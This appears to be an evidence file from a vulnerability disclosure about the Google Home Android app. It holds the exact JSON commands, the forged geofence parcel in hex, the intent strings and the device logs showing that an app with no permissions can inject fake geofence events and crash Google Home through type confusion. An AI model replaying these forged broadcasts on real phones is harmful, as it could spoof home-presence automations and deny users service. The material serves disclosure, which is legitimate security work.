@@ -1,0 +1,52 @@
+==============================================================================================================
+GOOGLE HOME GEOFENCE INJECTION - CONSOLIDATED EVIDENCE
+Device: Pixel 6a (bluejay) | Android 17 (API 37) | build CP41.260814.003.A2
+Attacker: com.vrp.probe, UID 10362, ZERO declared Android permissions
+==============================================================================================================
+
+##############################################################################################################
+### A. INTEGRITY — forged well-formed geofence event
+CMD: {"type": "forgeGeo", "geofenceId": "ATTACKER_CONTROLLED_GEOFENCE", "lat": 12.9716, "lng": 77.5946, "radius": 150.0, "transition": 1, "errorCode": 0}
+google home pid before: 7139
+--------------------------------------------------------------------------------------------------------------
+10-02 14:33:33.020 I/VRPPROBE( 5971): == EXEC RECEIVED action=com.vrp.probe.EXEC from ?
+10-02 14:33:33.023 I/VRPPROBE( 5971): CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=148
+10-02 14:33:33.023 I/VRPPROBE( 5971): CMD type=forgeGeo label=
+10-02 14:33:33.027 I/VRPPROBE( 5971): FORGED ParcelableGeofence bytes=156 hex=454fffff940000000100ffff400000001c000000410054005400410043004b00450052005f0043004f004e00540052004f004c004c00450044005f00470045004f00460045004e0043004500000000000200080000000000000000000300040096000000040008005396218e75f129
+10-02 14:33:33.027 I/VRPPROBE( 5971): FORGE_SEND #Intent;action=com.google.android.apps.chromecast.app.gf.GF_TRANSITION;component=com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver;i.gms_error_code=0;i.com.google.android.location.intent.extra.transition=1;end
+10-02 14:33:33.029 I/VRPPROBE( 5971): FORGE_BROADCAST_SENT
+10-02 14:33:33.029 I/VRPPROBE( 5971): == EXEC DONE
+10-02 14:33:33.034 E/HomeApp|qon( 7139): Geofencing event error: 0
+10-02 14:33:33.068 E/HomeApp|qon( 7139): Geofencing event error: 0
+10-02 14:33:33.068 E/HomeApp|GeofenceTransitionReportingWorker( 7139): Gf event error: 0 [CONTEXT is_gf_log=true ]
+10-02 14:33:33.554 W/HomeApp|akhg( 7139): Could not find home with ID: null
+10-02 14:33:33.850 W/HomeApp|akhg( 7139): Could not find home with ID: null
+
+##############################################################################################################
+### B. AVAILABILITY — type-confusion element crashes Google Home
+CMD: {"type": "broadcast", "action": "com.google.android.apps.chromecast.app.gf.GF_TRANSITION", "component": "com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver", "extras": {"gms_error_code": 0, "com.google.android.location.intent.extra.transition": 1, "com.google.android.location.intent.extra.geofence_list": ["a-string-element"], "com.google.android.location.intent.extra.triggering_location": {"location": {"lat": 12.9716, "lng": 77.5946, "accuracy": 5}}}}
+google home pid before: 7661
+--------------------------------------------------------------------------------------------------------------
+10-02 14:33:44.025 I/VRPPROBE( 5971): == EXEC RECEIVED action=com.vrp.probe.EXEC from ?
+10-02 14:33:44.027 I/VRPPROBE( 5971): CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=494
+10-02 14:33:44.028 I/VRPPROBE( 5971): CMD type=broadcast label=
+10-02 14:33:44.029 I/VRPPROBE( 5971): BROADCAST #Intent;action=com.google.android.apps.chromecast.app.gf.GF_TRANSITION;component=com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver;i.gms_error_code=0;i.com.google.android.location.intent.extra.transition=1;end
+10-02 14:33:44.032 I/VRPPROBE( 5971):   BROADCAST_SENT
+10-02 14:33:44.032 I/VRPPROBE( 5971): == EXEC DONE
+10-02 14:33:44.034 E/AndroidRuntime( 7661): FATAL EXCEPTION: main
+10-02 14:33:44.034 E/AndroidRuntime( 7661): Process: com.google.android.apps.chromecast.app, PID: 7661
+10-02 14:33:44.034 E/AndroidRuntime( 7661): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
+10-02 14:33:44.034 E/AndroidRuntime( 7661): 	at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:127)
+10-02 14:33:44.043 E/HomeApp|vaq( 7661): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
+10-02 14:33:44.043 E/HomeApp|vaq( 7661): 	at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:127)
+10-02 14:33:44.149 I/VRPPROBE( 5971): CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=494
+10-02 14:33:44.149 I/VRPPROBE( 5971): CMD type=broadcast label=
+10-02 14:33:44.149 I/VRPPROBE( 5971): BROADCAST #Intent;action=com.google.android.apps.chromecast.app.gf.GF_TRANSITION;component=com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver;i.gms_error_code=0;i.com.google.android.location.intent.extra.transition=1;end
+10-02 14:33:44.151 I/VRPPROBE( 5971):   BROADCAST_SENT
+10-02 14:33:44.340 E/AndroidRuntime( 8108): FATAL EXCEPTION: main
+10-02 14:33:44.340 E/AndroidRuntime( 8108): Process: com.google.android.apps.chromecast.app, PID: 8108
+10-02 14:33:44.340 E/AndroidRuntime( 8108): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
+10-02 14:33:44.340 E/AndroidRuntime( 8108): 	at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:127)
+10-02 14:33:44.372 E/HomeApp|vaq( 8108): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
+10-02 14:33:44.372 E/HomeApp|vaq( 8108): 	at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:127)
+
